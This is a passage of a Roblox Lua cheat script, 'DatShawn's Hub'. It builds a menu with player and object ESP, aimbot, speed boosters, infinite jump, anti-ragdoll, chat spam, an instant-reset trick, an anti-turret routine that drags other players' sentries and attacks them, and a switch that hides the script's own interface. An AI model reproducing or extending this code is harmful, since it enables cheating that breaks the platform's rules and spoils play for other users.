	line.BorderSizePixel = 0
	line.Parent = ActionsPanel

	local function makeActionRow(name, y, keyCode, color)
		local row = Instance.new("Frame")
		row.Size = UDim2.new(1, -20, 0, 36)
		row.Position = UDim2.fromOffset(10, y)
		row.BackgroundColor3 = Color3.fromRGB(29, 23, 46)
		row.BorderSizePixel = 0
		row.Parent = ActionsPanel
		Instance.new("UICorner", row).CornerRadius = UDim.new(0, 8)
		local label = Instance.new("TextLabel")
		label.Size = UDim2.fromOffset(122, 36)
		label.Position = UDim2.fromOffset(9, 0)
		label.BackgroundTransparency = 1
		label.Text = name
		label.TextColor3 = Color3.fromRGB(238, 242, 255)
		label.TextSize = 10
		label.Font = Enum.Font.FredokaOne
		label.TextXAlignment = Enum.TextXAlignment.Left
		label.Parent = row
		local keyButton = Instance.new("TextButton")
		keyButton.Size = UDim2.fromOffset(45, 26)
		keyButton.Position = UDim2.fromOffset(139, 5)
		keyButton.BackgroundColor3 = Color3.fromRGB(65, 105, 205)
		keyButton.Text = keyDisplay(keyCode)
		keyButton.TextColor3 = Color3.new(1, 1, 1)
		keyButton.TextSize = 9
		keyButton.Font = Enum.Font.FredokaOne
		keyButton.AutoButtonColor = false
		keyButton.Parent = row
		Instance.new("UICorner", keyButton).CornerRadius = UDim.new(0, 6)
		local useButton = Instance.new("TextButton")
		useButton.Size = UDim2.fromOffset(69, 26)
		useButton.Position = UDim2.new(1, -75, 0, 5)
		useButton.BackgroundColor3 = color or Color3.fromRGB(166, 72, 225)
		useButton.Text = "USE"
		useButton.TextColor3 = Color3.new(1, 1, 1)
		useButton.TextSize = 9
		useButton.Font = Enum.Font.FredokaOne
		useButton.AutoButtonColor = false
		useButton.Parent = row
		Instance.new("UICorner", useButton).CornerRadius = UDim.new(0, 6)
		local useScale = Instance.new("UIScale")
		useScale.Name = "UsePopScale"
		useScale.Scale = 1
		useScale.Parent = useButton
		local useStroke = Instance.new("UIStroke")
		useStroke.Name = "UsePopGlow"
		useStroke.Color = Color3.fromRGB(235, 220, 255)
		useStroke.Transparency = 0.72
		useStroke.Thickness = 1
		useStroke.Parent = useButton
		local baseColor = useButton.BackgroundColor3
		local hoverColor = baseColor:Lerp(Color3.new(1, 1, 1), 0.13)
		local popBusy = false
		connect(useButton.MouseEnter, function()
			TweenService:Create(useButton, TweenInfo.new(0.14, Enum.EasingStyle.Quad), {BackgroundColor3 = hoverColor}):Play()
			TweenService:Create(useScale, TweenInfo.new(0.16, Enum.EasingStyle.Back, Enum.EasingDirection.Out), {Scale = 1.045}):Play()
			TweenService:Create(useStroke, TweenInfo.new(0.14), {Transparency = 0.35, Thickness = 1.4}):Play()
		end)
		connect(useButton.MouseLeave, function()
			if popBusy then return end
			TweenService:Create(useButton, TweenInfo.new(0.16, Enum.EasingStyle.Quad), {BackgroundColor3 = baseColor}):Play()
			TweenService:Create(useScale, TweenInfo.new(0.16, Enum.EasingStyle.Quad), {Scale = 1}):Play()
			TweenService:Create(useStroke, TweenInfo.new(0.16), {Transparency = 0.72, Thickness = 1}):Play()
		end)
		connect(useButton.MouseButton1Down, function()
			TweenService:Create(useScale, TweenInfo.new(0.07, Enum.EasingStyle.Quad, Enum.EasingDirection.Out), {Scale = 0.90}):Play()
			TweenService:Create(useButton, TweenInfo.new(0.07), {BackgroundColor3 = baseColor:Lerp(Color3.new(0, 0, 0), 0.12)}):Play()
		end)
		connect(useButton.MouseButton1Click, function()
			if popBusy then return end
			popBusy = true
			task.spawn(function()
				local burst = TweenService:Create(useScale, TweenInfo.new(0.18, Enum.EasingStyle.Back, Enum.EasingDirection.Out), {Scale = 1.14})
				burst:Play(); burst.Completed:Wait()
				TweenService:Create(useScale, TweenInfo.new(0.16, Enum.EasingStyle.Quart, Enum.EasingDirection.Out), {Scale = 1}):Play()
				TweenService:Create(useButton, TweenInfo.new(0.22, Enum.EasingStyle.Quad), {BackgroundColor3 = baseColor}):Play()
				local flash = TweenService:Create(useStroke, TweenInfo.new(0.08), {Transparency = 0.05, Thickness = 2.4})
				flash:Play(); flash.Completed:Wait()
				TweenService:Create(useStroke, TweenInfo.new(0.28, Enum.EasingStyle.Quad), {Transparency = 0.72, Thickness = 1}):Play()
				task.wait(0.18)
				popBusy = false
			end)
		end)
		return keyButton, useButton
	end

	local techUse, selfUse, leaveUse, resetUse, rejoinUse
	ActionControls.Buttons.Rejoin, rejoinUse = makeActionRow("Rejoin", 43, RejoinKey, Color3.fromRGB(65, 125, 195))
	ActionControls.Buttons.RagdollTech, techUse = makeActionRow("Ragdoll Tech", 84, ActionControls.RagdollTechKey)
	ActionControls.Buttons.RagdollSelf, selfUse = makeActionRow("Ragdoll Self", 125, ActionControls.RagdollSelfKey)
	ActionControls.Buttons.Leave, leaveUse = makeActionRow("Leave Game", 166, LeaveKey, Color3.fromRGB(155, 48, 55))
	ActionControls.Buttons.InstantReset, resetUse = makeActionRow("Instant Reset", 207, ActionControls.InstantResetKey, Color3.fromRGB(190, 70, 55))

	-- Auto Ragdoll Tech toggle (below the Carpet Speed row at y=248)
	do
		local row = Instance.new("Frame")
		row.Name = "AutoRagdollTechRow"
		row.Size = UDim2.new(1, -20, 0, 36)
		row.Position = UDim2.fromOffset(10, 289)
		row.BackgroundColor3 = Color3.fromRGB(29, 23, 46)
		row.BorderSizePixel = 0
		row.Parent = ActionsPanel
		Instance.new("UICorner", row).CornerRadius = UDim.new(0, 8)
		local label = Instance.new("TextLabel")
		label.Size = UDim2.fromOffset(180, 36)
		label.Position = UDim2.fromOffset(9, 0)
		label.BackgroundTransparency = 1
		label.Text = "Auto Ragdoll Tech"
		label.TextColor3 = Color3.fromRGB(238, 242, 255)
		label.TextSize = 10
		label.Font = Enum.Font.FredokaOne
		label.TextXAlignment = Enum.TextXAlignment.Left
		label.Parent = row
		local toggle = Instance.new("TextButton")
		toggle.Size = UDim2.fromOffset(50, 26)
		toggle.Position = UDim2.new(1, -58, 0, 5)
		toggle.Parent = row
		paintSliderToggle(toggle, State.AutoRagdollTech, Color3.fromRGB(166, 72, 225))
		connect(toggle.MouseButton1Click, function()
			State.AutoRagdollTech = not State.AutoRagdollTech
			paintSliderToggle(toggle, State.AutoRagdollTech, Color3.fromRGB(166, 72, 225))
			saveSettings()
			notify("Auto Ragdoll Tech: " .. (State.AutoRagdollTech and "ON" or "OFF"), State.AutoRagdollTech)
		end)
	end

	local techBusy, lastTechAt = false, 0
	local resetBusy = false
	ActionControls.Run.RagdollSelf = function()
		local worked = runQuickCommand(LP, "ragdoll", true)
		local cooldown = not worked and quickCooldownRemaining("ragdoll") or 0
		notify(worked and "Ragdoll Self used"
			or (cooldown > 0 and ("Ragdoll on cooldown: " .. math.ceil(cooldown) .. "s") or "Ragdoll Self unavailable"), worked)
		return worked
	end
	ActionControls.Run.RagdollTech = function()
		-- Auto Grab calls this AND its hold fires PromptButtonHoldBegan: once per grab, not twice.
		if techBusy or tick() - lastTechAt < 3 then return end
		techBusy, lastTechAt = true, tick()
		-- DatShawn's original Ragdoll Tech: potion -> 0.1s -> Ragdoll Self, then the grab finishes.
		-- Calls the potion directly: AutoBigPotion.activate now routes back here when auto is on.
		task.spawn(function()
			pcall(activateNeptuneStyleGrabPotion)
			task.wait(0.1)
			ActionControls.Run.RagdollSelf()
			techBusy = false
		end)
	end
	ActionControls.Run.Rejoin = function()
		task.spawn(function()
			local teleport = game:GetService("TeleportService")
			pcall(function() LP:Kick("Rejoining...") end)
			pcall(function() teleport:Teleport(game.PlaceId, LP) end)
		end)
	end
	ActionControls.Run.Leave = function()
		notify("Leaving game...", false, Color3.fromRGB(85, 85, 105))
		task.delay(0.05, function() pcall(function() game:Shutdown() end) end)
	end
	ActionControls.Run.InstantReset = function()
		if resetBusy then return end
		local character = LP.Character
		local humanoid = character and character:FindFirstChildOfClass("Humanoid")
		local root = humanoid and (humanoid.RootPart or character:FindFirstChild("HumanoidRootPart"))
		if not character or not humanoid or humanoid.Health <= 0 or not root then return end
		resetBusy = true
		Env._FH_LAUNCHING = true
		task.spawn(function()
			local camera = workspace.CurrentCamera
			local frozen = camera and camera.CFrame
			local oldType = camera and camera.CameraType
			local bindName = "DatShawnInstantResetCamera"
			local newCharacter
			local addedConnection
			local respawnConnection = LP.CharacterAdded:Connect(function(newChar) newCharacter = newChar end)
			local function hide(object)
				if object:IsA("BasePart") or object:IsA("Decal") then object.LocalTransparencyModifier = 1 end
			end
			pcall(function()
				camera.CameraType = Enum.CameraType.Scriptable
				RunService:BindToRenderStep(bindName, Enum.RenderPriority.Camera.Value + 1, function()
					if camera and frozen then camera.CFrame = frozen end
				end)
				for _, object in ipairs(character:GetDescendants()) do hide(object) end
				addedConnection = character.DescendantAdded:Connect(hide)
				for _, object in ipairs(character:GetDescendants()) do
					if object:IsA("BasePart") then object.Anchored = false; object.CanCollide = false
					elseif object.Name == "SeatWeld" then object:Destroy() end
				end
			end)
			local started = os.clock()
			while not newCharacter and os.clock() - started < 0.4 and humanoid.Parent do
				pcall(function()
					humanoid.PlatformStand = false; humanoid.Sit = false; humanoid.AutoRotate = true
					humanoid.HipHeight = 1e30
					root.Anchored = false
					root.Velocity = Vector3.new(0, 50000, 0)
				end)
				RunService.Heartbeat:Wait()
			end
			if not newCharacter then
				local floor = workspace.FallenPartsDestroyHeight
				local voidStarted = os.clock()
				while not newCharacter and os.clock() - voidStarted < 0.6 and root.Parent do
					pcall(function()
						root.CFrame = CFrame.new(0, floor - 500, 0)
						root.Velocity = Vector3.new(0, -50000, 0)
					end)
					RunService.Heartbeat:Wait()
				end
			end
			while not newCharacter and os.clock() - started < 6 do
				pcall(function() humanoid.Health = 0; humanoid:ChangeState(Enum.HumanoidStateType.Dead) end)
				pcall(function() character:BreakJoints() end)
				task.wait(0.1)
			end
			pcall(function() respawnConnection:Disconnect() end)
			if addedConnection then pcall(function() addedConnection:Disconnect() end) end
			pcall(function() RunService:UnbindFromRenderStep(bindName) end)
			pcall(function()
				camera.CameraType = oldType == Enum.CameraType.Scriptable and Enum.CameraType.Custom or oldType
				local newHumanoid = newCharacter and (newCharacter:FindFirstChildOfClass("Humanoid") or newCharacter:WaitForChild("Humanoid", 5))
				if newHumanoid then camera.CameraSubject = newHumanoid end
			end)
			Env._FH_LAUNCHING = false
			resetBusy = false
		end)
	end

	for kind, button in pairs(ActionControls.Buttons) do
		connect(button.MouseButton1Click, function()
			State.WaitingForKey = kind
			button.Text = "..."
			button.BackgroundColor3 = Color3.fromRGB(190, 135, 35)
		end)
	end
	connect(techUse.MouseButton1Click, function()
		ActionControls.Run.RagdollTech()
	end)
	connect(selfUse.MouseButton1Click, function() ActionControls.Run.RagdollSelf() end)
	connect(leaveUse.MouseButton1Click, function() ActionControls.Run.Leave() end)
	connect(rejoinUse.MouseButton1Click, function() ActionControls.Run.Rejoin() end)
	connect(resetUse.MouseButton1Click, function() ActionControls.Run.InstantReset() end)
end
setupActionsPanel()

end
setupAdminPanels()

local function textLabel(text, position, size, fontSize, bold)
	local label = Instance.new("TextLabel")
	label.BackgroundTransparency = 1
	label.Position = position
	label.Size = size
	label.Text = text
	label.TextColor3 = Color3.fromRGB(235, 235, 245)
	label.TextSize = fontSize or 12
	label.Font = bold and Enum.Font.FredokaOne or Enum.Font.FredokaOne
	label.TextXAlignment = Enum.TextXAlignment.Left
	label.Parent = Main
	return label
end

local function button(text, position, size, color)
	local b = Instance.new("TextButton")
	b.Position = position
	b.Size = size
	b.BackgroundColor3 = color or Color3.fromRGB(185, 50, 55)
	b.Text = text
	b.TextColor3 = Color3.new(1, 1, 1)
	b.TextSize = 10
	b.Font = Enum.Font.FredokaOne
	b.AutoButtonColor = false
	b.Parent = Main
	Instance.new("UICorner", b).CornerRadius = UDim.new(0, 6)
	return b
end

local function speedBox(value, position, maximum)
	local box = Instance.new("TextBox")
	box.Position = position
	box.Size = UDim2.fromOffset(58, 28)
	box.BackgroundColor3 = Color3.fromRGB(31, 32, 40)
	box.Text = tostring(value)
	box.PlaceholderText = "MAX " .. tostring(maximum or 40)
	box.TextColor3 = Color3.new(1, 1, 1)
	box.TextSize = 11
	box.Font = Enum.Font.FredokaOne
	box.ClearTextOnFocus = false
	box.Parent = Main
	Instance.new("UICorner", box).CornerRadius = UDim.new(0, 6)
	return box
end

local HubTitle = textLabel("DatShawn's Hub", UDim2.fromOffset(16, 8), UDim2.fromOffset(250, 27), 18, true)
local OldFeatureHeader = textLabel("Feature", UDim2.fromOffset(14, 38), UDim2.fromOffset(130, 18), 9, true)
local OldValueHeader = textLabel("Value", UDim2.fromOffset(158, 38), UDim2.fromOffset(58, 18), 9, true)
local OldKeyHeader = textLabel("Key", UDim2.fromOffset(221, 38), UDim2.fromOffset(50, 18), 9, true)

local AutoPotionToggle = button("OFF", UDim2.fromOffset(265, 60), UDim2.fromOffset(51, 28))
local AutoPotionLabel = textLabel("Auto Giant Potion", UDim2.fromOffset(14, 60), UDim2.fromOffset(220, 28), 11, true)

-- One clean launcher in the Ctrl panel opens the complete Regular/Giant
-- speed controller instead of repeating every booster control in this page.
Env.DatShawnPlayerBoosterLabel = textLabel("Player Booster", UDim2.fromOffset(14, 99), UDim2.fromOffset(220, 28), 11, true)
Env.DatShawnPlayerBoosterOpenButton = button("OPEN", UDim2.fromOffset(245, 99), UDim2.fromOffset(71, 28), Color3.fromRGB(35, 35, 35))

local ESPToggle = button("OFF", UDim2.fromOffset(265, 99), UDim2.fromOffset(51, 28))
local ESPLabel = textLabel("Player ESP", UDim2.fromOffset(14, 99), UDim2.fromOffset(220, 28), 11, true)

local RegularLabel = textLabel("Regular Booster", UDim2.fromOffset(14, 138), UDim2.fromOffset(140, 28), 11, true)
local RegularBox = speedBox(RegularSpeed, UDim2.fromOffset(158, 138))
local RegularKeyButton = button(RegularKey.Name, UDim2.fromOffset(221, 138), UDim2.fromOffset(39, 28), Color3.fromRGB(55, 80, 170))
local RegularToggle = button("OFF", UDim2.fromOffset(265, 138), UDim2.fromOffset(51, 28))

local GiantLabel = textLabel("Giant Booster", UDim2.fromOffset(14, 177), UDim2.fromOffset(140, 28), 11, true)
local GiantBox = speedBox(GiantSpeed, UDim2.fromOffset(158, 177))
local GiantKeyButton = button(GiantKey.Name, UDim2.fromOffset(221, 177), UDim2.fromOffset(39, 28), Color3.fromRGB(112, 60, 165))
local GiantToggle = button("OFF", UDim2.fromOffset(265, 177), UDim2.fromOffset(51, 28))

local CarpetLabel = textLabel("Carpet Booster", UDim2.fromOffset(14, 216), UDim2.fromOffset(140, 28), 11, true)
local CarpetBox = speedBox(CarpetSpeed, UDim2.fromOffset(158, 216), MAX_CARPET_SPEED)
local CarpetKeyButton = button(CarpetKey.Name, UDim2.fromOffset(221, 216), UDim2.fromOffset(39, 28), Color3.fromRGB(175, 95, 35))
local CarpetToggle = button("OFF", UDim2.fromOffset(265, 216), UDim2.fromOffset(51, 28))

local JumpLabel = textLabel("Infinite Jump", UDim2.fromOffset(14, 255), UDim2.fromOffset(200, 28), 11, true)
local JumpKeyButton = button(JumpKey.Name, UDim2.fromOffset(221, 255), UDim2.fromOffset(39, 28), Color3.fromRGB(55, 80, 170))
local JumpToggle = button("OFF", UDim2.fromOffset(265, 255), UDim2.fromOffset(51, 28))

local BaseESPLabel = textLabel("Base Allow + Timer ESP", UDim2.fromOffset(14, 294), UDim2.fromOffset(245, 28), 11, true)
local BaseESPToggle = button("OFF", UDim2.fromOffset(265, 294), UDim2.fromOffset(51, 28))

local AimbotLabel = textLabel("Aimbot", UDim2.fromOffset(14, 333), UDim2.fromOffset(245, 28), 11, true)
local AimbotToggle = button("OFF", UDim2.fromOffset(265, 333), UDim2.fromOffset(51, 28))

local AntiRagdollLabel = textLabel("Anti Ragdoll", UDim2.fromOffset(14, 372), UDim2.fromOffset(200, 28), 11, true)
local AntiRagdollKeyButton = button(AntiRagdollKey.Name, UDim2.fromOffset(221, 372), UDim2.fromOffset(39, 28), Color3.fromRGB(125, 70, 175))
local AntiRagdollToggle = button("OFF", UDim2.fromOffset(265, 372), UDim2.fromOffset(51, 28))

local ActionsPanelLabel = textLabel("Actions Panel", UDim2.fromOffset(14, 411), UDim2.fromOffset(245, 28), 11, true)
local ActionsPanelToggle = button("OFF", UDim2.fromOffset(265, 411), UDim2.fromOffset(51, 28))

local QuickPanelLabel = textLabel("Quick Panel", UDim2.fromOffset(14, 450), UDim2.fromOffset(245, 28), 11, true)
local QuickPanelToggle = button("OFF", UDim2.fromOffset(265, 450), UDim2.fromOffset(51, 28))

local APSpamLabel = textLabel("DatShawn AP SPAM", UDim2.fromOffset(14, 489), UDim2.fromOffset(245, 28), 11, true)
local APSpamToggle = button("OFF", UDim2.fromOffset(265, 489), UDim2.fromOffset(51, 28))

local XDSpamLabel = textLabel("XD SPAM", UDim2.fromOffset(14, 528), UDim2.fromOffset(245, 28), 11, true)
local XDSpamToggle = button("OFF", UDim2.fromOffset(265, 528), UDim2.fromOffset(51, 28))

local DefensePanelLabel = textLabel("Auto Defense Panel", UDim2.fromOffset(14, 567), UDim2.fromOffset(245, 28), 11, true)
local DefensePanelToggle = button("OFF", UDim2.fromOffset(265, 567), UDim2.fromOffset(51, 28))

local CooldownPanelLabel = textLabel("Command Cooldowns", UDim2.fromOffset(14, 567), UDim2.fromOffset(245, 28), 11, true)
local CooldownPanelToggle = button("OFF", UDim2.fromOffset(265, 567), UDim2.fromOffset(51, 28))

local TradeRegionLabel = textLabel("Trade Region Block", UDim2.fromOffset(14, 606), UDim2.fromOffset(200, 28), 11, true)
local TradeRegionKeyButton = button(TradeRegionKey.Name, UDim2.fromOffset(221, 606), UDim2.fromOffset(39, 28), Color3.fromRGB(50, 115, 155))
local TradeRegionToggle = button("OFF", UDim2.fromOffset(265, 606), UDim2.fromOffset(51, 28))

local TradePlazaLabel = textLabel("Trade Plaza Block", UDim2.fromOffset(14, 645), UDim2.fromOffset(200, 28), 11, true)
local TradePlazaKeyButton = button(TradePlazaKey.Name, UDim2.fromOffset(221, 645), UDim2.fromOffset(39, 28), Color3.fromRGB(50, 115, 155))
local TradePlazaToggle = button("OFF", UDim2.fromOffset(265, 645), UDim2.fromOffset(51, 28))

OldFeatureHeader:Destroy()
OldValueHeader:Destroy()
OldKeyHeader:Destroy()
local hubTitleGradient = Instance.new("UIGradient", HubTitle)
hubTitleGradient.Color = ColorSequence.new({
	ColorSequenceKeypoint.new(0, Color3.fromRGB(235, 242, 255)),
	ColorSequenceKeypoint.new(0.55, Color3.fromRGB(185, 150, 255)),
	ColorSequenceKeypoint.new(1, Color3.fromRGB(105, 220, 235)),
})

local TabBar = Instance.new("Frame")
TabBar.Size = UDim2.new(1, -28, 0, 32)
TabBar.Position = UDim2.fromOffset(14, 48)
TabBar.BackgroundTransparency = 1
TabBar.Parent = Main
local tabLayout = Instance.new("UIListLayout", TabBar)
tabLayout.FillDirection = Enum.FillDirection.Horizontal
tabLayout.Padding = UDim.new(0, 6)

local PageHolder = Instance.new("Frame")
PageHolder.Size = UDim2.new(1, -28, 0, 292)
PageHolder.Position = UDim2.fromOffset(14, 90)
PageHolder.BackgroundTransparency = 1
PageHolder.ClipsDescendants = true
PageHolder.Parent = Main

local Pages = {}
local TabButtons = {}
local function makeHubPage(name)
	local scrollable = name == "Utils" or name == "Visual" or name == "Main"
	local page = Instance.new(scrollable and "ScrollingFrame" or "Frame")
	page.Name = name .. "Page"
	page.Size = UDim2.fromScale(1, 1)
	page.BackgroundTransparency = 1
	if scrollable then
		page.CanvasSize = UDim2.fromOffset(0, name == "Utils" and 510 or 380)
		page.ScrollBarThickness = 4
		page.ScrollBarImageColor3 = Color3.fromRGB(110, 90, 220)
		page.ScrollingDirection = Enum.ScrollingDirection.Y
	end
	page.Visible = false
	page.Parent = PageHolder
	local scale = Instance.new("UIScale", page)
	scale.Scale = 1
	Pages[name] = {Frame = page, Scale = scale}
	return page
end

local MainPage = makeHubPage("Main")
local VisualPage = makeHubPage("Visual")
local PlayerPage = makeHubPage("Player")
local UtilsPage = makeHubPage("Utils")

-- Standalone ESP / defense controllers used by the Utils controls below.
Env.DatShawnFeatureControls = {}
do
local FC = Env.DatShawnFeatureControls
local FeatureESPFolder = Instance.new("Folder")
FeatureESPFolder.Name = "DatShawnFeatureESP"
FeatureESPFolder.Parent = GUI
local featureMarks = {Brainrot = {}, Clone = {}, Mine = {}, BearTrap = {}}

local function clearFeatureMarks(kind)
	for object, data in pairs(featureMarks[kind]) do
		if data.highlight then data.highlight:Destroy() end
		if data.label then data.label:Destroy() end
		featureMarks[kind][object] = nil
	end
end

local function markFeature(kind, object, text, color)
	if not object or not object.Parent or featureMarks[kind][object] then return end
	local adornee = object:IsA("Model") and object or object
	local part = object:IsA("BasePart") and object or object:FindFirstChild("Head") or object.PrimaryPart or object:FindFirstChildWhichIsA("BasePart", true)
	if not part then return end
	local highlight = Instance.new("Highlight")
	highlight.Name = "DatShawn" .. kind .. "Highlight"
	highlight.Adornee = adornee
	highlight.FillColor = color
	local whiteESP = kind == "Clone" or kind == "Mine" or kind == "BearTrap"
	highlight.OutlineColor = whiteESP and Color3.fromRGB(255, 255, 255) or Color3.new(0, 0, 0)
	highlight.FillTransparency = kind == "BearTrap" and 0 or (whiteESP and 0.08 or 0.42)
	highlight.OutlineTransparency = 0
	highlight.DepthMode = Enum.HighlightDepthMode.AlwaysOnTop
	highlight.Parent = FeatureESPFolder
	local label = Instance.new("BillboardGui")
	label.Name = "DatShawn" .. kind .. "Label"
	label.Adornee = part
	label.Size = UDim2.fromOffset(260, 38)
	label.StudsOffset = Vector3.new(0, 3, 0)
	label.AlwaysOnTop = true
	label.Parent = FeatureESPFolder
	local txt = Instance.new("TextLabel")
	txt.Size = UDim2.fromScale(1, 1)
	txt.BackgroundTransparency = 1
	txt.Text = text
	txt.TextColor3 = color
	txt.TextStrokeTransparency = 0
	txt.Font = Enum.Font.FredokaOne
	txt.TextSize = 14
	txt.Parent = label
	featureMarks[kind][object] = {highlight = highlight, label = label}
end

local function cloneOwnerText(clone)
	local humanoid = clone and clone:FindFirstChildOfClass("Humanoid")
	local cloneDisplay = humanoid and humanoid.DisplayName or ""
	local nameFromModel = clone and clone.Name:gsub("_Clone.*$", "") or ""
	for _, player in ipairs(Players:GetPlayers()) do
		if player.Name == nameFromModel or player.DisplayName == cloneDisplay then
			return player.DisplayName .. " (@" .. player.Name .. ")'s Clone"
		end
	end
	local shown = cloneDisplay ~= "" and cloneDisplay or nameFromModel
	return shown .. (nameFromModel ~= "" and " (@" .. nameFromModel .. ")" or "") .. "'s Clone"
end

local function mineOwnerText(mine)
	local username = mine and mine.Name:match("^SubspaceTripmine(.+)$") or nil
	local player = username and Players:FindFirstChild(username) or nil
	if player then return player.DisplayName .. " (@" .. player.Name .. ")'s Mine" end
	return username and (username .. " (@" .. username .. ")'s Mine") or "Unknown Mine"
end

-- Resolves the complete deployed trap model from outer names, inner parts,
-- prompts, or identifying attributes. Subspace tripmines are excluded.
local FeatureRuntime = {bearTrapCache = {}, turretCache = {}}
function FeatureRuntime.resolveBearTrap(object)
	if not object or not object.Parent then return nil end
	local function normalized(value)
		return tostring(value or ""):lower():gsub("[%s_%-%.]", "")
	end
	local function isTrapText(value)
		local name = normalized(value)
		if name == "" or name:find("tripmine", 1, true) or name:find("subspacemine", 1, true) then return false end
		return name:find("beartrap", 1, true) ~= nil
			or name == "trap"
			or (name:find("bear", 1, true) ~= nil and name:find("trap", 1, true) ~= nil)
	end

	local matched = isTrapText(object.Name)
	if object:IsA("ProximityPrompt") then
		matched = matched or isTrapText(object.ActionText) or isTrapText(object.ObjectText)
	end
	if not matched then
		for _, attribute in ipairs({"Item", "ItemName", "Tool", "ToolName", "Type", "ObjectType", "DisplayName"}) do
			if isTrapText(object:GetAttribute(attribute)) then matched = true; break end
		end
	end
	if not matched then return nil end

	local candidate
	if object:IsA("Model") then
		candidate = object
	elseif object:IsA("BasePart") then
		candidate = object:FindFirstAncestorWhichIsA("Model") or object
	else
		candidate = object:FindFirstAncestorWhichIsA("Model") or object:FindFirstAncestorWhichIsA("BasePart")
	end
	if not candidate or not candidate.Parent then return nil end
	if candidate:IsA("Model") and candidate:FindFirstChildOfClass("Humanoid") then return nil end
	return candidate
end

local function selectedPrioritySignature()
	local ag = rawget(_G, "AutoGrab") or AutoGrab
	return ag and ag.priority and next(ag.priority) or nil
end

-- Maintain lightweight indexes as objects enter/leave Workspace instead of
-- traversing every descendant several times per second.
function FeatureRuntime.isTurretPart(object)
	return object:IsA("BasePart") and (object.Name == "Candy Sentry"
		or object.Name:match("^Sentry_%d+$") or object.Name:match("^SentryCandy_%d+$"))
end
function FeatureRuntime.indexWorldObject(object)
	local trap = FeatureRuntime.resolveBearTrap(object)
	if trap then FeatureRuntime.bearTrapCache[trap] = true end
	if FeatureRuntime.isTurretPart(object) then FeatureRuntime.turretCache[object] = true end
end
for _, object in ipairs(workspace:GetDescendants()) do FeatureRuntime.indexWorldObject(object) end
connect(workspace.DescendantAdded, function(object) task.defer(FeatureRuntime.indexWorldObject, object) end)
connect(workspace.DescendantRemoving, function(object)
	FeatureRuntime.bearTrapCache[object] = nil
	FeatureRuntime.turretCache[object] = nil
end)

task.spawn(function()
	while GUI.Parent do
		-- A selected Auto Steal Priority is an unconditional Brainrot ESP filter.
		local selected = selectedPrioritySignature()
		local brainrotWanted = not _G._DatShawnHideAllESP and (State.BrainrotESP or selected ~= nil)
		_G._FH_ESPNeedList = brainrotWanted
		-- The full ESP bundled with the imported priority system owns brainrot
		-- labels/highlights. A selected signature remains an exact red filter even
		-- when the ordinary Brainrot ESP switch is off.
		_G._FH_SelectedSig = (not _G._DatShawnHideAllESP) and selected or nil
		local priorityBrainrotESP = rawget(_G, "_FH_REG_BrainrotESP")
		if priorityBrainrotESP and type(priorityBrainrotESP.set) == "function" then
			pcall(priorityBrainrotESP.set, State.BrainrotESP and not _G._DatShawnHideAllESP)
		end
		clearFeatureMarks("Brainrot")

		if State.CloneESP and not _G._DatShawnHideAllESP then
			for _, obj in ipairs(workspace:GetChildren()) do
				if obj:IsA("Model") and obj.Name:find("_Clone", 1, true) then markFeature("Clone", obj, cloneOwnerText(obj), Color3.fromRGB(255, 255, 255)) end
			end
		else clearFeatureMarks("Clone") end

		if State.MineESP and not _G._DatShawnHideAllESP then
			local folder = workspace:FindFirstChild("ToolsAdds")
			if folder then for _, obj in ipairs(folder:GetChildren()) do
				if obj:IsA("BasePart") and obj.Name:match("^SubspaceTripmine") then markFeature("Mine", obj, mineOwnerText(obj), Color3.fromRGB(255, 255, 255)) end
			end end
		else clearFeatureMarks("Mine") end

		if State.BearTrapESP and not _G._DatShawnHideAllESP then
			local present = {}
			for trap in pairs(FeatureRuntime.bearTrapCache) do
				if trap and trap.Parent then
					present[trap] = true
					markFeature("BearTrap", trap, "BEAR TRAP", Color3.fromRGB(255, 255, 255))
				else FeatureRuntime.bearTrapCache[trap] = nil end
			end
			for object, data in pairs(featureMarks.BearTrap) do
				if not present[object] or not object.Parent then
					if data.highlight then data.highlight:Destroy() end
					if data.label then data.label:Destroy() end
					featureMarks.BearTrap[object] = nil
				end
			end
		else clearFeatureMarks("BearTrap") end

		if State.AntiTurret then
			local character = LP.Character
			local root = character and character:FindFirstChild("HumanoidRootPart")
			local humanoid = character and character:FindFirstChildOfClass("Humanoid")
			for obj in pairs(FeatureRuntime.turretCache) do
				if obj and obj.Parent then
					local owner = obj.Name:match("(%d+)$")
					if not owner or owner ~= tostring(LP.UserId) then
						obj.CanCollide = false
						if root and (obj.Position - root.Position).Magnitude <= 220 then
							obj.CFrame = root.CFrame * CFrame.new(0, 1, -4)
							local bat = character:FindFirstChild("Bat") or (LP:FindFirstChild("Backpack") and LP.Backpack:FindFirstChild("Bat"))
							if bat and bat.Parent ~= character and humanoid then humanoid:EquipTool(bat) end
							if bat then bat:Activate() end
						end
					end
				else FeatureRuntime.turretCache[obj] = nil end
			end
		end
		task.wait(0.5)
	end
end)

Env.DatShawnPrivacyFeatures = {}
do
	local P = Env.DatShawnPrivacyFeatures
	local hiddenGuis, guiConnections = {}, {}
	local espSnapshot = nil
	local hideApplied = false

	local function disconnectGuiWatchers()
		for _, connection in ipairs(guiConnections) do pcall(function() connection:Disconnect() end) end
		table.clear(guiConnections)
	end

	local function hideScreenGui(screenGui)
		if not screenGui:IsA("ScreenGui") then return end
		-- Only hide interfaces created by this script. Never touch the
		-- game's original HUD, backpack, chat, prompts, or admin UI here.
		local name = screenGui.Name:lower()
		local isScriptGui = screenGui == GUI
			or name == "datshawnsscriptsgui"
			or name == "autostealprioritystandalone"
			or name:find("datshawn", 1, true) ~= nil
		if not isScriptGui then return end
		if hiddenGuis[screenGui] == nil then hiddenGuis[screenGui] = screenGui.Enabled end
		pcall(function() screenGui.Enabled = false end)
	end

	local function guiRoots()
		local roots = {PlayerGui}
		pcall(function() table.insert(roots, game:GetService("CoreGui")) end)
		return roots
	end

	local function hideEveryGui()
		for _, root in ipairs(guiRoots()) do
			for _, object in ipairs(root:GetDescendants()) do hideScreenGui(object) end
			table.insert(guiConnections, root.DescendantAdded:Connect(function(object)
				if hideApplied and object:IsA("ScreenGui") then task.defer(hideScreenGui, object) end
			end))
		end
	end

	local function turnOffESP()
		if not espSnapshot then
			espSnapshot = {
				player = State.ESP, base = State.BaseESP, brainrot = State.BrainrotESP,
				clone = State.CloneESP, mine = State.MineESP, bearTrap = State.BearTrapESP,
			}
		end
		_G._DatShawnHideAllESP = true
		State.ESP, State.BaseESP, State.BrainrotESP, State.CloneESP, State.MineESP, State.BearTrapESP = false, false, false, false, false, false
		disableESP()
		clearBaseESP()
		clearFeatureMarks("Brainrot"); clearFeatureMarks("Clone"); clearFeatureMarks("Mine"); clearFeatureMarks("BearTrap")
	end

	local function restoreESP()
